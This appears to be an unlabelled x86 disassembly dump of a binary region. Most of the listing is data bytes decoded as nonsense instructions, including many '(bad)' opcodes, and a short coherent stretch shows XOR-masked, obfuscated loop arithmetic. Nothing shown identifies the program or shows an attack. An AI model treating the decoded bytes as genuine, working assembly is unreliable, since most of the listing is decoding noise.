  41ec0c:	pushf  
  41ec0d:	jmp    0x41ec8e
  41ec0f:	leave  
  41ec10:	inc    ebp
  41ec11:	scas   eax,DWORD PTR es:[edi]
  41ec12:	jnp    0x41ec61
  41ec14:	push   0xffffff91
  41ec16:	aas    
  41ec17:	xchg   ebx,eax
  41ec18:	jne    0x41ebe0
  41ec1a:	dec    esi
  41ec1b:	xchg   ebp,eax
  41ec1c:	push   edx
  41ec1d:	rcl    BYTE PTR [esi-0x8adfb2e],1
  41ec23:	and    ah,BYTE PTR ds:0xfe4a4b45
  41ec29:	les    eax,FWORD PTR [ebx]
  41ec2b:	mov    ch,0xe
  41ec2d:	sar    esp,0x3
  41ec30:	add    al,0x86
  41ec32:	loopne 0x41ec2e
  41ec34:	jno    0x41ec40
  41ec36:	sub    eax,0x121b8f5a
  41ec3b:	dec    eax
  41ec3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec3d:	sub    BYTE PTR [edx],0x49
  41ec40:	mov    bl,0xc5
  41ec43:	mov    edx,0x78fde15e
  41ec48:	sub    DWORD PTR [edx+edi*1-0x72b80cf],0x19
  41ec50:	mov    cl,0x84
  41ec52:	stc    
  41ec53:	jae    0x41ec26
  41ec55:	lahf   
  41ec56:	fldenv [ecx]
  41ec58:	mov    eax,ds:0x18e2b3a5
  41ec5d:	lahf   
  41ec5e:	repnz pop esp
  41ec60:	jnp    0x41ecd7
  41ec62:	test   edx,edx
  41ec64:	xchg   ebp,eax
  41ec65:	icebp  
  41ec66:	mov    al,ds:0x58e79bce
  41ec6b:	lods   eax,DWORD PTR ds:[esi]
  41ec6c:	mov    ch,0xd7
  41ec6e:	pop    ecx
  41ec6f:	adc    edx,DWORD PTR [ebp+0x45]
  41ec72:	data16 jne 0x41ec2e
  41ec75:	mov    bl,0x71
  41ec77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ec78:	lea    esp,[ecx]
  41ec7a:	mul    dl
  41ec7c:	adc    edi,edx
  41ec7e:	mov    dh,0x88
  41ec80:	jo     0x41ec76
  41ec82:	fidiv  DWORD PTR [edi]
  41ec84:	dec    edi
  41ec85:	mov    WORD PTR [edi-0x3c],ss
  41ec88:	jecxz  0x41eced
  41ec8a:	dec    eax
  41ec8b:	aaa    
  41ec8c:	push   eax
  41ec8d:	jno    0x41ec1d
  41ec8f:	loopne 0x41ece8
  41ec91:	int    0xf
  41ec93:	dec    eax
  41ec94:	test   BYTE PTR [edx],bh
  41ec96:	mov    ah,0x25
  41ec98:	jp     0x41ed11
  41ec9a:	sub    BYTE PTR [ecx],bl
  41ec9c:	and    DWORD PTR ds:[esi+0x2],edx
  41eca0:	lock lock add BYTE PTR [ecx],bh
  41eca4:	call   0xa5092e36
  41eca9:	ins    BYTE PTR es:[edi],dx
  41ecaa:	pop    ecx
  41ecab:	push   0x6d
  41ecad:	les    ebx,FWORD PTR [ecx+0x5b]
  41ecb0:	ja     0x41ec52
  41ecb2:	imul   eax,ebx,0x7935e811
  41ecb8:	sahf   
  41ecb9:	or     esi,DWORD PTR [edi-0x3b]
  41ecbc:	add    bh,BYTE PTR [edx-0x41]
  41ecbf:	les    ecx,FWORD PTR [esi+0x56]
  41ecc2:	inc    eax
  41ecc3:	push   ss
  41ecc4:	mov    ah,0x68
  41ecc6:	retf   0x8242
  41ecc9:	in     al,dx
  41ecca:	jae    0x41ec9a
  41eccc:	pushf  
  41eccd:	mov    ch,0xc0
  41eccf:	push   esi
  41ecd0:	inc    esp
  41ecd1:	(bad)  
  41ecd2:	rol    BYTE PTR [ebx+0x585b6559],1
  41ecd8:	xor    BYTE PTR [ebx+0x6a796878],dl
  41ecde:	jl     0x41ed5b
  41ece0:	sbb    DWORD PTR [ebx],edi
  41ece2:	aad    0xac
  41ece4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ece5:	in     al,dx
  41ece6:	xor    ah,BYTE PTR [esi-0x7]
  41ece9:	cmp    edx,DWORD PTR [edi+0x75]
  41ecec:	adc    ebp,DWORD PTR [edx+0x32]
  41ecef:	jg     0x41ed65
  41ecf1:	add    al,0xc2
  41ecf3:	sub    ecx,esi
  41ecf5:	xor    ecx,eax
  41ecf7:	mov    DWORD PTR [ebp+0x8],ecx
  41ecfa:	mov    ecx,DWORD PTR [ebp+0x8]
  41ecfd:	mov    edx,DWORD PTR [ebp+0x8]
  41ed00:	imul   edx,edx,0x5708f5
  41ed06:	xor    ecx,eax
  41ed08:	add    ecx,esi
  41ed0a:	lea    ecx,[ebp+ecx*4-0x64]
  41ed0e:	mov    edi,DWORD PTR [ecx]
  41ed10:	add    edx,edi
  41ed12:	mov    DWORD PTR [ecx],edx
  41ed14:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed17:	xor    ecx,eax
  41ed19:	add    ecx,esi
  41ed1b:	jne    0x41c96c
  41ed21:	mov    ecx,DWORD PTR [ebp-0x8]
  41ed24:	mov    edx,DWORD PTR [ebp-0x20]
  41ed27:	xor    ecx,eax
  41ed29:	lea    ecx,[ecx+edx*1+0x3272db]
  41ed30:	mov    DWORD PTR [ebp-0x20],ecx
  41ed33:	inc    DWORD PTR [ebp+0xc]
  41ed36:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ed39:	xor    ecx,eax
  41ed3b:	add    ecx,esi
  41ed3d:	jne    0x41c71d
  41ed43:	jmp    0x421147
  41ed48:	mov    ecx,DWORD PTR [ebp-0xc]
  41ed4b:	mov    DWORD PTR [ebp+0x8],ecx
  41ed4e:	jmp    0x41ed80
  41ed53:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed56:	mov    edx,DWORD PTR [ebp-0x8]
  41ed59:	xor    ecx,eax
  41ed5b:	xor    edx,eax
  41ed5d:	sub    ecx,edx
  41ed5f:	sub    ecx,esi
  41ed61:	xor    ecx,eax
  41ed63:	mov    DWORD PTR [ebp+0x8],ecx
  41ed66:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed69:	mov    edx,DWORD PTR [ebp+0x8]
  41ed6c:	imul   edx,edx,0x5708f5
  41ed72:	xor    ecx,eax
  41ed74:	add    ecx,esi
  41ed76:	lea    ecx,[ebp+ecx*4-0x64]
  41ed7a:	mov    edi,DWORD PTR [ecx]
  41ed7c:	add    edx,edi
  41ed7e:	mov    DWORD PTR [ecx],edx
  41ed80:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed83:	xor    ecx,eax
  41ed85:	add    ecx,esi
  41ed87:	jne    0x41ed53
  41ed8d:	jmp    0x421153
  41ed92:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed95:	mov    edx,DWORD PTR [ebp-0x8]
  41ed98:	xor    ecx,eax
  41ed9a:	xor    edx,eax
  41ed9c:	sub    ecx,edx
  41ed9e:	sub    ecx,esi
  41eda0:	xor    ecx,eax
  41eda2:	mov    DWORD PTR [ebp+0x8],ecx
  41eda5:	mov    ecx,DWORD PTR [ebp+0x8]
  41eda8:	mov    edx,DWORD PTR [ebp+0x8]
  41edab:	xor    ecx,eax
  41edad:	imul   edx,edx,0x5708f5
  41edb3:	add    ecx,esi
  41edb5:	lea    ecx,[ebp+ecx*4-0x64]
  41edb9:	jmp    0x421134
  41edbe:	dec    ecx
  41edbf:	xor    eax,0xa7642764
  41edc4:	test   DWORD PTR [ebx],edx
  41edc6:	mov    esi,0x54e70850
  41edcb:	mov    WORD PTR [ebp+0x61da83f0],ss
  41edd1:	bound  eax,QWORD PTR [edi+ebx*2]
  41edd4:	bound  esp,QWORD PTR [edx-0x80]
  41edd7:	adc    BYTE PTR [edx-0x3b9a6d59],ch
  41eddd:	xchg   edi,eax
  41edde:	mov    edx,0xdb108351
  41ede3:	adc    ah,BYTE PTR [edx+0x47]
  41ede6:	mov    dl,BYTE PTR gs:[edi-0x5c14b53d]
  41eded:	jmp    0x41ed91
  41edef:	dec    esp
  41edf0:	sub    al,bl
  41edf2:	pusha  
  41edf3:	cmp    eax,0x263f7dec
  41edf8:	dec    DWORD PTR [ebx+0x38dfdc16]
  41edfe:	nop
  41edff:	sahf   
  41ee00:	jbe    0x41ee33
  41ee02:	pop    esp
  41ee03:	mov    WORD PTR [ebp+0x7d],gs
  41ee06:	ret    0xdd69
  41ee09:	mov    bl,0x6a
  41ee0b:	xor    al,0x3e
  41ee0d:	outs   dx,BYTE PTR ds:[esi]
  41ee0e:	lods   al,BYTE PTR ds:[esi]
  41ee0f:	sbb    ebp,esp
  41ee11:	call   0x1153:0xc2146b4c
  41ee18:	fwait
  41ee19:	inc    edx
  41ee1a:	add    ah,BYTE PTR [ebp+0x69]
  41ee1d:	(bad)  
  41ee1e:	(bad)  
  41ee1f:	and    bl,0xc0
  41ee22:	ins    BYTE PTR es:[edi],dx
  41ee23:	cmp    BYTE PTR ds:0x47fde46,dl
  41ee29:	xor    BYTE PTR [esi+0x87dc64d],0xbe
  41ee30:	mov    ecx,0x473d7cfc
  41ee35:	pushf  
  41ee36:	jnp    0x41edec
  41ee38:	mov    esi,0x13d08b8a
  41ee3d:	ret    
  41ee3e:	sbb    DWORD PTR ss:[eax-0x5bedd4af],eax
  41ee45:	mov    DWORD PTR [ecx-0xb],0x8df8517f
  41ee4c:	into   
  41ee4d:	mov    ecx,0xea59c1b3
  41ee52:	repnz enter 0x7f1d,0x81
  41ee57:	femms  
  41ee59:	inc    edi
  41ee5a:	pop    eax
  41ee5b:	xor    ecx,DWORD PTR [eax-0x797c763]
  41ee61:	shl    DWORD PTR [ebx],cl
  41ee63:	mov    eax,ds:0x30d05496
  41ee68:	adc    DWORD PTR [ecx],edi
  41ee6a:	mov    cl,0xd9
  41ee6c:	adc    ecx,DWORD PTR [ebx+ecx*4]
  41ee6f:	rol    BYTE PTR [ecx],1
  41ee71:	or     edi,ebp
  41ee73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee74:	dec    ebx
  41ee75:	mov    edi,0xa8c01327
  41ee7a:	jno    0x41ee18
  41ee7c:	xchg   ebp,eax
  41ee7d:	xor    ebp,DWORD PTR [ebp+0x5b]
  41ee80:	jge    0x41ee04
  41ee82:	fs pop ss
  41ee84:	adc    eax,0x6db81c01
  41ee89:	outs   dx,DWORD PTR ds:[esi]
  41ee8a:	das    
  41ee8b:	push   eax
  41ee8c:	in     eax,0xfa
  41ee8e:	xchg   edi,eax
  41ee8f:	cmp    DWORD PTR [edi+0x34a252b],eax
  41ee95:	ror    DWORD PTR [ebx],0x45
  41ee98:	ret    0x9e9c
  41ee9b:	jmp    0x41ee88
  41ee9d:	ja     0x41eeef
  41ee9f:	sahf   
  41eea0:	arpl   WORD PTR [edx-0x2070534b],cx
  41eea6:	mov    ebp,0x3e272b85
  41eeab:	std    
  41eeac:	mov    ch,0xc6
  41eeae:	mov    esp,0x8cf742de
  41eeb3:	imul   ecx,DWORD PTR [ebx+0x70cfd21b],0x1d951014
  41eebd:	icebp  
  41eebe:	pop    ss
  41eebf:	(bad)  
  41eec0:	mov    eax,0x2102288d
  41eec5:	loop   0x41eea2
  41eec7:	div    DWORD PTR [eax]
  41eec9:	out    dx,al
  41eeca:	add    BYTE PTR [ecx],al
  41eecc:	js     0x41ee6c
  41eece:	mov    ebx,0xec4186cf
  41eed3:	mov    ebp,0xf1fd751f
  41eed8:	inc    ebx
  41eed9:	clc    
  41eeda:	sbb    al,0xc9
  41eedc:	add    DWORD PTR [edi-0x79],ecx
  41eedf:	call   0x8235a79f
  41eee4:	adc    edi,edi
  41eee6:	cwde   
  41eee7:	lods   al,BYTE PTR ds:[esi]
  41eee8:	test   DWORD PTR [edi+eiz*1],esi
  41eeeb:	repnz in al,0xe6
  41eeee:	cmp    DWORD PTR [edx+0x12225021],edi
  41eef4:	mov    ah,0xd1
  41eef6:	xor    bl,BYTE PTR [eax+0x36]
  41eef9:	neg    BYTE PTR [edi-0xa1156e6]
  41eeff:	(bad)  
  41ef00:	jb     0x41ef55
  41ef02:	fucomip st,st(2)
  41ef04:	dec    ebx
  41ef05:	pop    ss
  41ef06:	cmp    eax,DWORD PTR [esi+0x5a]
  41ef09:	cs pop ds
  41ef0b:	mov    eax,0xc6fd668c
  41ef10:	xchg   BYTE PTR [ebx+0x6218a7ed],dl
  41ef16:	and    ah,BYTE PTR [edx+0x736dc15c]
  41ef1c:	pusha  
  41ef1d:	xlat   BYTE PTR ds:[ebx]
  41ef1e:	or     al,0xa1
  41ef20:	enter  0xd525,0xa4
  41ef24:	(bad)  
  41ef25:	jp     0x41ef13
  41ef27:	aam    0x40
  41ef29:	dec    edx
  41ef2a:	mov    gs,WORD PTR [edi-0x59c14bbb]
  41ef30:	pop    ebx
  41ef31:	xchg   ebx,eax
  41ef32:	shl    eax,1
  41ef34:	ret    
  41ef35:	cli    
  41ef36:	adc    bl,dl
  41ef38:	jg     0x41eebc
  41ef3a:	or     al,0x86
  41ef3c:	mov    al,0xb6
  41ef3e:	cmp    esi,DWORD PTR [ecx]
  41ef40:	fdiv   QWORD PTR [ecx]
  41ef42:	inc    ebp
  41ef43:	cwde   
  41ef44:	ins    BYTE PTR es:[edi],dx
  41ef45:	and    al,0x32
  41ef47:	mov    eax,ds:0x78fcd38
  41ef4c:	ins    BYTE PTR es:[edi],dx
  41ef4d:	mov    ebp,0xd378fcd5
  41ef52:	iret   
  41ef53:	pop    esp
  41ef54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef55:	pop    ecx
  41ef56:	outs   dx,BYTE PTR ds:[esi]
  41ef57:	push   ebx
  41ef58:	mov    WORD PTR ds:0x983b97db,?
  41ef5e:	pop    eax
  41ef5f:	(bad)  
  41ef60:	mov    bh,0xf6
  41ef62:	cld    
  41ef63:	pop    DWORD PTR [ecx-0x38]
  41ef66:	into   
  41ef67:	loop   0x41ef19
  41ef69:	dec    edx
  41ef6a:	ret    0x5192
  41ef6d:	fidivr WORD PTR [edx]
  41ef6f:	or     BYTE PTR [ebx-0xe],bh
  41ef72:	cwde   
  41ef73:	sub    DWORD PTR [ebp-0x1c],eax
  41ef76:	inc    ecx
  41ef77:	ss adc al,0xa2
  41ef7a:	pusha  
  41ef7b:	mov    ebp,0xfb701c1d
  41ef80:	(bad)  
  41ef81:	xchg   edi,eax
  41ef82:	scas   al,BYTE PTR es:[edi]
  41ef83:	and    BYTE PTR [edx],ch
  41ef85:	addr16 retf 
  41ef87:	(bad)
  41ef8a:	push   ecx
  41ef8b:	pop    ss
  41ef8c:	cmp    al,0x7d
  41ef8e:	xchg   esp,eax
  41ef8f:	scas   eax,DWORD PTR es:[edi]
  41ef90:	jp     0x41f00b
  41ef92:	jp     0x41efd7
  41ef94:	adc    BYTE PTR [ecx],dh
  41ef96:	mov    eax,0xc71a8c35
  41ef9b:	inc    esi
  41ef9c:	fs repnz xchg esp,eax
  41ef9f:	test   esi,esp
  41efa1:	fistp  WORD PTR [eax+0x55]
  41efa4:	ja     0x41efdb
  41efa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efa7:	out    0xec,eax
  41efa9:	mov    dh,ch
  41efab:	pop    es
  41efac:	stc    
  41efad:	icebp  
  41efae:	into   
  41efaf:	adc    edi,ebx
  41efb1:	in     eax,0xb2
  41efb3:	and    eax,0xd98d440c
  41efb8:	pop    es
  41efb9:	shr    BYTE PTR [ebx-0x1a],cl
  41efbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efbd:	pop    edi
  41efbe:	js     0x41efb9
  41efc0:	fisub  WORD PTR [edx-0x18580b72]
  41efc6:	enter  0x6e4f,0x12
  41efca:	sti    
  41efcb:	sub    al,0x1c
  41efcd:	fcom   DWORD PTR [edi]
  41efcf:	push   0xffffff8e
  41efd1:	mov    ecx,0x8b55d34e
  41efd6:	ret    
  41efd7:	cmp    DWORD PTR [ebx-0x29],ebp
  41efda:	test   DWORD PTR [eax+esi*1-0x7fc28c2c],0xa09f8d81
  41efe5:	mov    bl,bl
  41efe7:	in     al,dx
  41efe8:	mov    esi,0x9995b2d7
  41efed:	dec    edi
  41efee:	dec    DWORD PTR ds:0x143b6607
  41eff4:	add    dl,ch
  41eff6:	sbb    eax,0x6766e8ef
  41effb:	dec    eax
  41effc:	add    al,0x71
  41effe:	mov    al,0x46
  41f000:	xchg   esi,eax
  41f001:	test   DWORD PTR [edx+0x33],ebx
  41f004:	adc    bh,BYTE PTR [ebx]
  41f006:	xchg   ebp,eax
  41f007:	ins    BYTE PTR es:[edi],dx
  41f008:	test   eax,0x7c57299c
  41f00d:	(bad)  
  41f00f:	xchg   DWORD PTR [ebx],ebp
  41f011:	push   cs
  41f012:	pop    esp
  41f013:	bound  ebx,QWORD PTR [ebx-0x31]
  41f016:	dec    eax
  41f017:	nop
  41f018:	and    ch,ah
  41f01a:	dec    ebp
  41f01b:	cdq    
  41f01c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f01d:	mov    eax,ds:0x9a559ed
  41f022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f023:	out    0xfe,eax
  41f025:	jmp    FWORD PTR [eax-0x6f9be3e]
  41f02b:	out    0x76,eax
  41f02d:	fs dec ebx
  41f02f:	inc    edi
  41f030:	xchg   edx,eax
  41f031:	(bad)  
  41f032:	in     eax,dx
  41f033:	pushf  
  41f034:	adc    esp,DWORD PTR [ebp-0x444b4875]
  41f03a:	sbb    BYTE PTR [ebp+0x1a],dh
  41f03d:	inc    esp
  41f03e:	xchg   BYTE PTR [ebx-0x6c341760],cl
  41f044:	sub    esi,DWORD PTR [ecx*2+0x35947f1e]
  41f04b:	inc    ebx
  41f04c:	int3   
  41f04d:	or     bh,BYTE PTR [ebp+0xeafa318]
  41f053:	jmp    0x41effb
  41f055:	in     al,0xbf
  41f057:	dec    edx
  41f058:	cwde   
  41f059:	pop    ebx
  41f05a:	lahf   
  41f05b:	inc    esp
  41f05c:	mov    eax,0xda0a9c24
  41f061:	sbb    eax,0x5d946b46
  41f066:	cmp    al,0xfb
  41f068:	xchg   BYTE PTR [eax-0x27],dh
  41f06b:	adc    DWORD PTR [edx],esi
  41f06d:	dec    esp
  41f06e:	(bad)  
  41f070:	mov    ds:0xcd2fc1d6,eax
  41f075:	or     ah,cl
  41f077:	and    esi,esp
  41f079:	(bad)  
  41f07a:	mov    ebp,0xd0ad0a77
  41f07f:	out    0x48,al
  41f081:	xor    ecx,DWORD PTR [edi]
  41f083:	imul   esi,DWORD PTR [edx],0x33b74257
  41f089:	xchg   ecx,eax
  41f08a:	in     eax,dx
  41f08b:	xchg   BYTE PTR [eax+eax*8-0x11],dl
  41f08f:	xor    DWORD PTR [ebp+0xc],esi
  41f092:	push   ss
  41f093:	jle    0x41f0f4
  41f095:	jle    0x41f0dc
  41f097:	sahf   
  41f098:	mov    ds:0x8cc61b59,eax
  41f09d:	xchg   DWORD PTR [edx],edx
  41f09f:	mov    bl,0x92
  41f0a1:	stc    
  41f0a2:	test   DWORD PTR [edx-0x2f21bfb3],ebp
  41f0a8:	mov    bl,0x15
  41f0aa:	outs   dx,BYTE PTR ds:[esi]
  41f0ab:	inc    ebx
  41f0ac:	push   eax
  41f0ad:	iret   
  41f0ae:	fcom   QWORD PTR [ebp+0x25]
  41f0b1:	inc    ebx
  41f0b2:	int    0x1b
  41f0b4:	sar    ecx,0x6f
  41f0b7:	dec    esi
  41f0b8:	dec    esp
  41f0b9:	mov    eax,ds:0xe71fe052
  41f0be:	add    al,0x59
  41f0c0:	mov    ecx,DWORD PTR [ebx+ecx*4+0x5f]
  41f0c4:	test   eax,0x9afabef3
  41f0c9:	leave  
  41f0ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0cb:	lods   al,BYTE PTR ds:[esi]
  41f0cc:	jle    0x41f103
  41f0ce:	push   0xffffff83
  41f0d0:	test   ah,0xb1
  41f0d3:	data16 lods al,BYTE PTR ds:[esi]
  41f0d5:	pusha  
  41f0d6:	stc    
  41f0d7:	mov    ecx,0x5f15c52f
  41f0dc:	pop    ecx
  41f0dd:	adc    ah,BYTE PTR ds:0xa3f8b445
  41f0e3:	ud2    
  41f0e5:	push   cs
  41f0e6:	add    eax,0x9efaaa89
  41f0eb:	adc    esi,ebx
  41f0ed:	add    ah,BYTE PTR [eax]
  41f0ef:	in     al,dx
  41f0f0:	dec    edi
  41f0f1:	mov    ds:0x4fd45c2b,al
  41f0f6:	sub    edi,DWORD PTR [ebx-0x3f2cbcde]
  41f0fc:	sub    dl,BYTE PTR [ecx-0x7f8ac61f]
  41f102:	fiadd  WORD PTR [edx+0x25]
  41f105:	(bad)
  41f109:	or     dh,BYTE PTR [edx]
  41f10b:	test   DWORD PTR ss:[ebp+edi*2-0x16390543],edx
  41f113:	adc    eax,0xb823df74
  41f118:	js     0x41f132
  41f11a:	jmp    0x41f0c8
  41f11c:	pop    esi
  41f11d:	xchg   bh,ch
  41f11f:	ror    DWORD PTR [edx+ebp*2+0x5c44e955],cl
  41f126:	and    dl,dl
  41f128:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f129:	outs   dx,BYTE PTR ds:[esi]
  41f12a:	imul   edi,DWORD PTR [eax*2-0x7ab85ee1],0x6b
  41f132:	jno    0x41f137
  41f134:	daa    
  41f135:	mov    dh,cl
  41f137:	push   ds
  41f138:	mov    WORD PTR [ebx+eax*1],cs
  41f13b:	mov    al,ds:0xcfb6dcc5
  41f140:	js     0x41f0ca
  41f142:	fadd   st,st(5)
  41f144:	loope  0x41f114
  41f146:	xor    ebp,DWORD PTR [ecx+0x13]
  41f149:	stos   BYTE PTR es:[edi],al
  41f14a:	sbb    al,0xb9
  41f14c:	(bad)  
  41f14d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f14e:	ss jns 0x41f111
  41f151:	retf   
  41f152:	nop
  41f153:	jmp    FWORD PTR [edx+eax*1+0x79347464]
  41f15a:	mov    eax,0x1d1479f8
  41f15f:	pushf  
  41f160:	and    dh,BYTE PTR [edi-0x756d3da9]
  41f166:	mov    bh,0x4f
  41f168:	push   ebx
  41f169:	jmp    FWORD PTR [ecx+0x37]
  41f16c:	push   0x315073e2
  41f171:	sar    BYTE PTR [esp+eiz*4+0x7f],1
  41f175:	xchg   dl,dh
  41f177:	sbb    al,0xd9
  41f179:	and    bh,BYTE PTR [edi+ecx*4+0x7608e9c5]
  41f180:	mov    ecx,0xc67d739a
  41f185:	add    ebp,DWORD PTR ds:0x44365174
  41f18b:	or     ecx,DWORD PTR [edi]
  41f18d:	inc    edx
  41f18e:	mov    eax,ds:0x6177447a
  41f193:	pushf  
  41f194:	mov    ah,0xbd
  41f196:	pop    ebp
  41f197:	jno    0x41f119
  41f199:	xchg   ecx,eax
  41f19a:	popa   
  41f19b:	in     al,0xcb
  41f19d:	jno    0x41f212
  41f19f:	mov    edi,DWORD PTR [ebx-0x6a]
  41f1a2:	mov    ebx,0x16a81d18
  41f1a7:	pcmpeqb mm2,QWORD PTR gs:[eax+0x2959c3d5]
  41f1af:	mov    ah,BYTE PTR [ebx+0x1c94acc7]
  41f1b5:	out    dx,eax
  41f1b6:	sar    esi,1
  41f1b8:	cmp    cx,WORD PTR cs:[ecx+edx*8+0x4a4551a4]
  41f1c1:	in     eax,0x56
  41f1c3:	fcomp  QWORD PTR [ebx-0x66]
  41f1c6:	aas    
  41f1c7:	lahf   
  41f1c8:	xlat   BYTE PTR ds:[ebx]
  41f1c9:	pop    edi
  41f1ca:	add    al,BYTE PTR [eax-0x5c75f2]
  41f1d0:	mov    eax,DWORD PTR [eax+ecx*1]
  41f1d3:	aaa    
  41f1d4:	outs   dx,BYTE PTR ds:[esi]
  41f1d6:	or     dl,ch
  41f1d8:	mov    ds:0xcba49078,eax
  41f1dd:	fwait
  41f1de:	add    al,0x60
  41f1e0:	sbb    BYTE PTR [ebp+0x4f],cl
  41f1e3:	or     esi,DWORD PTR [edi]
  41f1e5:	xchg   ebp,eax
  41f1e6:	aas    
  41f1e7:	ret    0x45da
  41f1ea:	pminub mm7,mm4
  41f1ed:	mov    WORD PTR [esi+0x5c468055],ds
  41f1f3:	pop    edx
  41f1f4:	hlt    
  41f1f5:	mov    esp,0x92415f50
  41f1fa:	jo     0x41f19e
  41f1fc:	cmp    eax,0x94d04c2
  41f201:	add    ah,BYTE PTR [edi-0x10125324]
  41f207:	imul   ebx,DWORD PTR [ebx+esi*1-0x2c],0x61
  41f20c:	jbe    0x41f1cd
  41f20e:	scas   al,BYTE PTR es:[edi]
  41f20f:	js     0x41f193
  41f211:	mov    DWORD PTR [ebp-0x5e6065c2],esp
  41f217:	push   ss
  41f218:	pop    ebp
  41f219:	adc    cl,BYTE PTR ds:0x464f6d61
  41f21f:	or     BYTE PTR [ebx],al
  41f221:	stos   DWORD PTR es:[edi],eax
  41f222:	mov    bh,0xcd
  41f224:	mov    eax,ds:0xdbc5b5fd
  41f229:	mov    ch,0x4d
  41f22b:	xchg   DWORD PTR [ebx*8-0x481ffe7],eax
  41f232:	test   al,0x29
  41f234:	jo     0x41f1c7
  41f236:	ret    0x5d8f
  41f239:	loope  0x41f28f
  41f23b:	fdiv   DWORD PTR [ecx-0x3483ccb7]
  41f241:	mov    ch,dh
  41f243:	sub    BYTE PTR [esi+0xb720d47],0x96
  41f24a:	pop    edx
  41f24b:	cwde   
  41f24c:	jecxz  0x41f2a8
  41f24e:	xchg   ebx,eax
  41f24f:	fisttp WORD PTR ds:[edx+0x53]
  41f253:	fsubr  DWORD PTR [edi-0x5c]
  41f256:	ins    BYTE PTR es:[edi],dx
  41f257:	push   eax
  41f258:	outs   dx,DWORD PTR ds:[esi]
  41f259:	retf   
  41f25a:	cdq    
  41f25b:	xchg   edi,eax
  41f25c:	mov    ah,0x94
  41f25e:	push   ecx
  41f25f:	sti    
  41f260:	into   
  41f261:	je     0x41f235
  41f263:	mov    ecx,0xc4e676b0
  41f268:	lahf   
  41f269:	and    DWORD PTR [edi],0x52
  41f26c:	adc    al,0x57
  41f26e:	dec    eax
  41f26f:	sbb    al,0x3c
  41f271:	scas   al,BYTE PTR es:[edi]
  41f272:	out    dx,al
  41f273:	pop    es
  41f274:	dec    ecx
  41f275:	pop    ebx
  41f276:	js     0x41f2cc
  41f278:	mov    eax,ds:0x49f1174e
  41f27d:	jo     0x41f285
  41f27f:	mov    eax,ds:0x6a92ea6f
  41f284:	ret    
  41f285:	pop    edi
  41f286:	cwde   
  41f287:	enter  0x2726,0xc8
  41f28b:	add    dh,BYTE PTR [ebx-0x46]
  41f28e:	sbb    BYTE PTR [ebp+0x5f],0x7
  41f292:	xlat   BYTE PTR ds:[ebx]
  41f293:	jbe    0x41f2bb
  41f295:	or     edi,DWORD PTR [ebx-0x33a970b3]
  41f29b:	les    ebp,FWORD PTR [eax]
  41f29d:	loop   0x41f250
  41f29f:	pop    edx
  41f2a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f2a1:	pop    edi
  41f2a2:	push   ds
  41f2a3:	and    ch,ch
  41f2a5:	pop    ebp
  41f2a6:	in     al,0x1d
  41f2a8:	sub    al,0x8e
  41f2aa:	enter  0x30c0,0xe0
  41f2ae:	imul   eax,DWORD PTR [ecx-0x76],0x548a6e0f
  41f2b5:	mov    ch,0xbb
  41f2b7:	pop    edi
  41f2b8:	pop    ds
  41f2b9:	in     eax,0x1f
  41f2bb:	dec    edi
  41f2bc:	rcr    DWORD PTR [ebp+edi*2-0x177133e4],cl
  41f2c3:	xor    al,0x7e
  41f2c5:	inc    edx
  41f2c6:	mov    ecx,0x3189192e
  41f2cb:	mov    edx,0xdc635d61
  41f2d0:	loopne 0x41f2ad
  41f2d2:	pop    ecx
  41f2d3:	outs   dx,DWORD PTR ds:[esi]
  41f2d4:	cmp    al,0x24
  41f2d6:	push   0x84d45084
  41f2db:	hlt    
  41f2dc:	jp     0x41f312
  41f2de:	xchg   edi,eax
  41f2df:	stos   DWORD PTR es:[edi],eax
  41f2e0:	div    BYTE PTR [edx-0xa]
  41f2e3:	xor    eax,0x60ed4d5f
  41f2e8:	lods   al,BYTE PTR ds:[esi]
  41f2e9:	adc    dh,BYTE PTR [ecx]
  41f2eb:	add    eax,0x773f642c
  41f2f0:	shr    DWORD PTR [esi+0x32],1
  41f2f3:	sti    
  41f2f4:	rol    esi,cl
  41f2f6:	xchg   esi,eax
  41f2f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2f8:	push   ebp
  41f2f9:	in     eax,0x3e
  41f2fb:	sbb    edx,edi
  41f2fd:	ror    BYTE PTR [edi],1
  41f2ff:	dec    esp
  41f300:	mov    esi,0x67fc62c3
  41f305:	and    esi,ebx
  41f307:	push   0x1bc0a3ae
  41f30c:	inc    edx
  41f30d:	xchg   ebp,eax
  41f30e:	mov    eax,0x64f0d9ed
  41f314:	pop    eax
  41f315:	pop    edx
  41f316:	cmc    
  41f317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f318:	outs   dx,DWORD PTR ds:[esi]
  41f319:	fnsave [ecx+0x18]
  41f31c:	and    eax,0x4055b4f5
  41f321:	retf   
  41f322:	fcom   DWORD PTR [ebp+0x33]
  41f325:	adc    DWORD PTR [esi-0x27f85f11],edi
  41f32b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f32c:	adc    BYTE PTR [edi-0x65f2e14e],dl
  41f332:	data16 sahf 
  41f334:	sub    edx,DWORD PTR [ecx+0x37]
  41f337:	(bad)  
  41f338:	dec    edi
  41f339:	stc    
  41f33a:	xchg   edx,eax
  41f33b:	adc    bh,al
  41f33d:	ret    0x6158
  41f340:	push   ecx
  41f341:	xor    eax,0x7e0c103
  41f346:	inc    ebp
  41f347:	(bad)  [esi]
  41f349:	dec    ebp
  41f34a:	mov    esi,0x25889cf0
